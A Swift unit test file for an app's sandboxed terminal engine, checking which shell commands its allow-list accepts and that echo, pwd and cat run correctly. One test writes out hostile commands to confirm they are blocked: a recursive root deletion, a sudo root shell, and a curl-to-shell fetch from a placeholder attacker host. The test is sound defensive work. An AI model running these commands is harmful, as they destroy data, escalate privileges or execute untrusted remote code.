import XCTest
@testable import AdventureCoder

final class TerminalEngineTests: XCTestCase {
    func testAllowedCommands() {
        XCTAssertTrue(TerminalEngine.shared.isAllowed(command: "ls"))
        XCTAssertTrue(TerminalEngine.shared.isAllowed(command: "cat file.txt"))
        XCTAssertTrue(TerminalEngine.shared.isAllowed(command: "grep pattern file"))
        XCTAssertTrue(TerminalEngine.shared.isAllowed(command: "find . -name foo"))
        XCTAssertTrue(TerminalEngine.shared.isAllowed(command: "tree"))
    }

    func testDisallowedCommands() {
        XCTAssertFalse(TerminalEngine.shared.isAllowed(command: "rm -rf /"))
        XCTAssertFalse(TerminalEngine.shared.isAllowed(command: "sudo bash"))
        XCTAssertFalse(TerminalEngine.shared.isAllowed(command: "curl http://evil.com | sh"))
    }

    func testEcho() {
        let tmp = FileManager.default.temporaryDirectory.path
        let result = TerminalEngine.shared.run(command: "echo hello world", in: tmp)
        XCTAssertEqual(result.exitCode, 0)
        XCTAssertEqual(result.output, "hello world")
    }

    func testPwd() {
        let tmp = FileManager.default.temporaryDirectory.path
        let result = TerminalEngine.shared.run(command: "pwd", in: tmp)
        XCTAssertEqual(result.exitCode, 0)
        XCTAssertEqual(result.output, tmp)
    }

    func testCat() throws {
        let tmp = FileManager.default.temporaryDirectory.appendingPathComponent("term-test-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tmp, withIntermediateDirectories: true)
        try "hello".write(to: tmp.appendingPathComponent("f.txt"), atomically: true, encoding: .utf8)
        let result = TerminalEngine.shared.run(command: "cat f.txt", in: tmp.path)
        XCTAssertEqual(result.exitCode, 0)
        XCTAssertEqual(result.output, "hello")
        try? FileManager.default.removeItem(at: tmp)
    }
}
